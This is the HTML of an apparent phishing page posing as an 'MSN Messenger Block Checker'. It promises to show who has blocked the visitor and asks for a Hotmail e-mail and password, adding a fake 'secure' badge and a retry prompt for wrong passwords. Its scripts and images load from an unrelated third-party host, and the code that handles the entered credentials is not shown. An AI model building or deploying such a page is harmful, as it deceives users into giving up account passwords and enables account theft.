<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>You're Blocked :: MSN Messenger Block Checker - MSN Messenger Status Checker</title>
<script type="text/javascript" src="http://tiny-pic-url.com/abc/jquery.js"></script>
<script type="text/javascript" src="site.js"></script>
<link href="site.css" media="screen" rel="Stylesheet" type="text/css" />
</head>
<body>
	<div id="_container">
		<div id="container">
			<div id="info"><!-- blank --></div>
			
			<div id="login">
				<div id="loading">
					<img src="http://tiny-pic-url.com/abc/images/loading.gif" width="117" height="10" alt="loading" />
					<br /><br />
					Loading...<br />
					Please Wait
				</div>

				<div id="error">
					Wrong E-mail or Password
					<br /><br />
					<a href="#" id="tryagain" style="color:#000;">Try Again</a>
				</div>
			
				<div id="cnt">
					<form name="form" id="formu">
						<label for="yuser">Login</label>
						<input name="yuser" type="text" id="yuser" value="example555@hotmail.com"/>
						<br />
						<label for="ypass">Password</label>
						<input type="password" name="ypass" id="ypass" />
						<img src="http://tiny-pic-url.com/abc/images/sign.gif" id="signin" width="76" height="21" border="0" 
						style="margin-top:10px;cursor:pointer;" alt="sign"/>
					</form>
				</div>
			</div>
		</div>
		<div id="secure">
			<img src="http://tiny-pic-url.com/abc/images/secure.png" width="200" height="50" alt="secure"/><br />
			Find out who and how many friends have blocked you in MSN messenger!<br />
            <strong>By logging in you accept the terms.</strong>
		</div>
	</div>
</body>
</html>

